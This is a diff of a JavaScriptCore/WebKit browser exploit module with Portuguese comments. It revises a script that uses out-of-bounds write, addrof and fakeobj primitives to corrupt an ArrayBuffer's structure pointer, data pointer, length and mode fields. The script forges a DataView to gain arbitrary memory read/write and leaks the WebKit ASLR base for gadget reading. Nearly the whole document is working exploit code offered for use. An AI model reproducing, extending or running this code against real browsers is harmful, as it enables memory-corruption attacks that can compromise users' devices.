@@ -1,11 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v29 - L/E Arbitrária por Comprimento de ArrayBuffer)
+// js/script3/testArrayBufferVictimCrash.mjs (v30 - Correção do Escopo de untagJSValuePointer)
 // =======================================================================================
-// ESTA VERSÃO MUDA COMPLETAMENTE A ESTRATÉGIA PARA L/E ARBITRÁRIA UNIVERSAL.
-// OBJETIVO: CORROMPER O COMPRIMENTO DE UM ARRAYBUFFER VIZINHO USANDO O OOB WRITE EXISTENTE.
+// ESTA VERSÃO CORRIGE O ERRO DE ESCOPO PARA A FUNÇÃO untagJSValuePointer.
 // 1. Validar primitivas OOB locais.
 // 2. Estabilizar e validar addrof_core/fakeobj_core.
-// 3. NOVO: Realizar Heap Grooming para alocação contígua e corromper o `m_length` de um ArrayBuffer vítima.
-// 4. Obter L/E Arbitrária Universal através do ArrayBuffer com comprimento corrompido.
+// 3. Vazar o ENDEREÇO REAL da JSC::Structure de DataView do heap JS, COM UNTAGGING.
+// 4. Configurar e testar a PRIMITIVA DE L/E ARBITRÁRIA UNIVERSAL (via fakeobj DataView) usando o endereço REAL da Structure.
 // 5. Vazar a base ASLR da WebKit usando a nova primitiva de L/E Universal.
 // 6. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
 // =======================================================================================
@@ -18,17 +17,17 @@ import {
     addrof_core,
     fakeobj_core,
     initCoreAddrofFakeobjPrimitives,
-    arb_read, // Esta é a arb_read local (usa oob_dataview_real)
+    arb_read, // Esta é a arb_read local (usa o oob_dataview_real)
     arb_write, // Esta é a arb_write local (usa o oob_dataview_real)
     selfTestOOBReadWrite,
     oob_read_absolute,
     oob_write_absolute,
-    oob_array_buffer_real // Importar para acesso direto ao buffer original
+    oob_array_buffer_real
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v29 - L/E Arbitrária por Comprimento de ArrayBuffer";
+export const FNAME_MODULE = "v30 - Correção do Escopo de untagJSValuePointer";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -37,14 +36,37 @@ const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
 const LOCAL_SHORT_SHORT_PAUSE = 50;
 
-const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8;
+const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Tamanho de um JSValue em 64-bit
 const OBJECT_PTR_TAG_HIGH = 0x402a0000;
 
-let global_spray_objects = []; // Spray inicial para estabilização geral
-let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente
+let global_spray_objects = [];
+let hold_objects = [];
 
-// A primitiva universal de leitura/escrita agora será o DataView criado sobre o ArrayBuffer de comprimento corrompido.
-let UNIVERSAL_ARBITRARY_RW_DATAVIEW = null;
+let UNIVERSAL_ARBITRARY_RW_DATAVIEW = null; // A primitiva universal de leitura/escrita
+
+
+/**
+ * Remove a tag de um AdvancedInt64 que representa um JSValue (ponteiro de objeto).
+ * Mover para o topo do módulo para visibilidade.
+ * @param {AdvancedInt64} taggedAddr O AdvancedInt64 representando o JSValue taggeado.
+ * @param {Function} logFn Função de log para depuração.
+ * @returns {AdvancedInt64} O AdvancedInt64 com a tag removida.
+ */
+function untagJSValuePointer(taggedAddr, logFn) {
+    if (!isAdvancedInt64Object(taggedAddr)) {
+        logFn(`[Untagging] ERRO: Valor para untagging não é AdvancedInt64. Tipo: ${typeof taggedAddr}.`, "critical", "untagJSValuePointer");
+        throw new TypeError("Valor para untagging não é AdvancedInt64.");
+    }
+    
+    const original_high = taggedAddr.high();
+    const untagged_high = original_high & 0x0000FFFF;
+    
+    if ((original_high & 0xFFFF0000) === (OBJECT_PTR_TAG_HIGH & 0xFFFF0000)) {
+        return new AdvancedInt64(taggedAddr.low(), untagged_high);
+    }
+    logFn(`[Untagging] ALERTA: Tentou untaggar valor com high inesperado (0x${original_high.toString(16)}). Nenhuma tag removida. Valor: ${taggedAddr.toString(true)}`, "warn", "untagJSValuePointer");
+    return taggedAddr;
+}
 
 
 // Funções Auxiliares Comuns (dumpMemory)
@@ -93,38 +115,12 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
         logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal não inicializada.`, "critical", FNAME);
         throw new Error("Universal ARB R/W primitive not initialized.");
     }
-    
-    // Calcula o offset do endereço alvo em relação ao início do UNIVERSAL_ARBITRARY_RW_DATAVIEW
-    // Assumimos que o m_vector do UNIVERSAL_ARBITRARY_RW_DATAVIEW aponta para o heap_base
-    // e que a leitura/escrita é feita a partir de offset 0.
-    // Para ler 'address', precisamos do 'offset' de 'address' em relação ao 'm_vector' original.
-    // Isto é complexo com JS, pois o DataView já tem um 'base address' interno.
-
-    // A estratégia do ArrayBuffer de comprimento corrompido:
-    // O UNIVERSAL_ARBITRARY_RW_DATAVIEW é um DataView que, ao ter seu byteLength manipulado para 0xFFFFFFFF,
-    // pode ler e escrever a partir do seu m_vector (endereço de dados).
-    // O m_vector do ArrayBuffer *real* é o que precisa ser manipulado para apontar para o endereço alvo.
-
-    // Para isso, precisamos do addrof do *ArrayBuffer* que está por trás do UNIVERSAL_ARBITRARY_RW_DATAVIEW.
-    // O UNIVERSAL_ARBITRARY_RW_DATAVIEW é uma DataView REAL sobre um ArrayBuffer com tamanho estendido.
-    // A leitura/escrita arbitrária é feita diretamente nos métodos get/set do DataView.
-    // `address` é o endereço ABSOLUTO. Precisamos calcular o offset para o `getUintX`/`setUintX`.
-
-    // Para ler um endereço arbitrário `X` usando um DataView `DV` que tem `DV.buffer` como `B`,
-    // e `B` tem `m_vector` em `P_B` e `m_length` corrompido, a leitura é `DV.getUintX(X - P_B)`.
-    // O `P_B` é o endereço base dos dados do `B`.
-
-    // O jeito mais simples é usar a `arb_read` e `arb_write` local para *alterar o m_vector*
-    // do `backing_array_buffer` do `UNIVERSAL_ARBITRARY_RW_DATAVIEW`.
 
     const current_ab_addr = addrof_core(UNIVERSAL_ARBITRARY_RW_DATAVIEW.buffer);
     const m_vector_offset_in_ab_obj = current_ab_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
-    // Salva o m_vector original do ArrayBuffer subjacente ao UNIVERSAL_ARBITRARY_RW_DATAVIEW
-    const original_m_vector_of_ab = await arb_read(m_vector_offset_in_ab_obj, 8); // Usa arb_read local
-
-    // Corrompe o m_vector para o endereço alvo
-    await arb_write(m_vector_offset_in_ab_obj, address, 8); // Usa arb_write local
+    const original_m_vector_of_ab = await arb_read(m_vector_offset_in_ab_obj, 8);
+    await arb_write(m_vector_offset_in_ab_obj, address, 8);
 
     let result = null;
     try {
@@ -140,7 +136,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
             default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
         }
     } finally {
-        await arb_write(m_vector_offset_in_ab_obj, original_m_vector_of_ab, 8); // Usa arb_write local
+        await arb_write(m_vector_offset_in_ab_obj, original_m_vector_of_ab, 8);
     }
     return result;
 }
@@ -231,9 +227,9 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
 
             // 2. Corrompa os metadados deste ArrayBuffer real usando a primitiva OOB local (arb_write).
             await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureAddress, 8);
-            await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8);
-            await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4);
-            await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), candidate_m_mode, 4);
+            await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8); // m_vector para 0 inicialmente
+            await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4); // m_length para máximo
+            await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), candidate_m_mode, 4); // m_mode para o candidato atual
 
             // 3. Use fakeobj_core para obter um DataView forjado no endereço do ArrayBuffer corrompido.
             const faked_data_view_instance = fakeobj_core(backing_ab_addr);
@@ -263,7 +259,7 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
             
             if (read_back_from_heap.equals(TEST_VALUE_UNIVERSAL)) {
                 logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(candidate_m_mode)}!`, "vuln", FNAME);
-                test_target_js_object.test_prop_sanity = TEST_VALUE_UNIVERSAL.low();
+                test_target_js_object.test_prop_sanity = TEST_VALUE_UNIVERSAL.low(); // Restaurar para limpeza.
                 success = true;
                 break;
             } else {
@@ -585,7 +581,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária universal múltiplas vezes...", "info");
         let resistanceSuccessCount_post_leak = 0;
         const numResistanceTests = 10;
-        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTCADEIRA_OFFSET); // ERRADO: BUTTERFLY_OFFSET
+        // Corrigido: `JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET`
+        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);
 
         for (let i = 0; i < numResistanceTests; i++) {
             const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
@@ -633,8 +630,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         global_spray_objects = [];
         hold_objects = [];
 
-        // Limpa também o DataView universal, se ele foi criado.
-        UNIVERSAL_ARBITRARY_RW_DATAVIEW = null; // Garante que a referência seja liberada.
+        UNIVERSAL_ARBITRARY_RW_DATAVIEW = null;
 
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
         logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
